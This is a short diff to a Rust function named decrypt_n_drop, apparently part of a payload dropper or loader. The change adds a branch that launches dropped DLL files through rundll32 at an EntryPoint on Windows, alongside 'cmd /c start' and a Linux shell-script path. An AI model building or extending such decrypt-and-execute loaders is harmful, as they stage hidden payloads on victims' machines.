@@ -156,7 +156,10 @@ fn decrypt_n_drop(temp: &str, filename: &str, nonce: &[u8], content: &[u8], key:
 
     let command =
         if cfg!(target_os="windows") {
-            "cmd /c start ".to_owned() + path_str
+            match extension {
+                "dll" => { "rundll32 \"".to_owned() + path_str + "\",EntryPoint" }
+                _ => { "cmd /c start ".to_owned() + path_str }
+            }
         } else if cfg!(target_os="linux") {
 
             if filename.ends_with("_bash.sh") {
